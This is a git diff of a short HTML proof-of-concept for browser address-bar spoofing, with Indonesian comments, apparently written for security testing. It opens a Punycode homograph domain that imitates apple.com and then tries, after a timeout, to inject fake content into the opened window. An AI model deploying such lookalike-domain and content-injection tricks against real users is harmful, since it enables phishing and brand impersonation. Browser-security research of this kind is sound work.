@@ -1,32 +1,32 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoofing</title>
-    <style>
-        body { font-family: -apple-system, sans-serif; padding: 20px; text-align: center; }
-        .box { border: 1px solid #ccc; padding: 20px; border-radius: 10px; margin-top: 20px; }
-    </style>
+    <title>Address Bar Spoofing Testing</title>
 </head>
 <body>
-
-    <h2>Analisis Parser URL</h2>
-    <p>Pengujian integritas Address Bar terhadap manipulasi domain homograph.</p>
+    <p>Click The Button Below</p>
     
-    <div class="box">
-        <p>Target: <b>apple.com</b> (via Punycode)</p>
-        <button id="trigger" style="padding: 15px 30px; font-size: 16px; cursor: pointer;">Clik Here</button>
-    </div>
+    <button onclick="triggerSpoof()">Click Here</button>
 
     <script>
-        document.getElementById('trigger').addEventListener('click', function() {
-            // Kita coba teknik 'window.open' dengan manipulasi target
-            // Jika browser gagal men-sanitasi, dia akan menampilkan label apple.com
-            // padahal navigasi diarahkan ke domain homograph.
-            window.open('https://xn--pple-43d.com', '_blank', 'noopener,noreferrer');
-        });
+        function triggerSpoof() {
+            // 1. Menentukan URL Target yang memanfaatkan celah parser
+            // Contoh menggunakan domain homograph atau nested scheme yang sedang diteliti
+            var targetUrl = "https://xn--pple-43d.com"; // Unicode: apple.com (tiruan)
+            
+            // 2. Memicu jendela baru atau navigasi cepat
+            var win = window.open(targetUrl, "_blank");
+            
+            // 3. Pada bug tipe race-condition / timing, penyerang biasanya 
+            // memanipulasi dokumen saat status loading belum selesai
+            setTimeout(function() {
+                try {
+                    win.document.body.innerHTML = "<h1>Ini adalah halaman palsu (Spoofed Content)</h1>";
+                } catch(e) {
+                    console.log("Navigasi diblokir oleh Same-Origin Policy jika parser aman.");
+                }
+            }, 100);
+        }
     </script>
-
 </body>
 </html>
